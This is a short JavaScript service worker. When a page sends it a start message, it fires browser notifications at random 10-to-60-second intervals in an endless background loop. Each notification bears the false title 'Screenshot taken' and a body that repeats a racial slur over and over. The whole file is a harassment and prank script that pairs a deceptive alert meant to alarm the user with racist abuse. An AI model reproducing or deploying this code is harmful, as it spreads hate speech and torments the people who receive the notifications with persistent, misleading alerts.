// Listen for the start command from the HTML page
self.addEventListener('message', (event) => {
    if (event.data && event.data.action === 'startLoop') {
        setupNextBackgroundNotification();
    }
});

function setupNextBackgroundNotification() {
    // Generate a random delay between 10 and 60 seconds
    const randomSeconds = Math.floor(Math.random() * (60 - 10 + 1)) + 10;
    const delayInMilliseconds = randomSeconds * 1000;

    // Use a timeout inside the worker
    setTimeout(() => {
        triggerBackgroundNotification();
        
        // Loop again seamlessly in the background
        setupNextBackgroundNotification();
    }, delayInMilliseconds);
}

function triggerBackgroundNotification() {
    const title = "Screenshot taken";
    const options = {
        body: "NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER",
        icon: "https://i.scdn.co/image/ab67616d0000b2737b9e92ae2a708047e63cf385",
        tag: "persistent-alert" // Prevents the system from getting flooded with old alerts
    };

    // Service workers use self.registration to show notifications
    self.registration.showNotification(title, options);
}
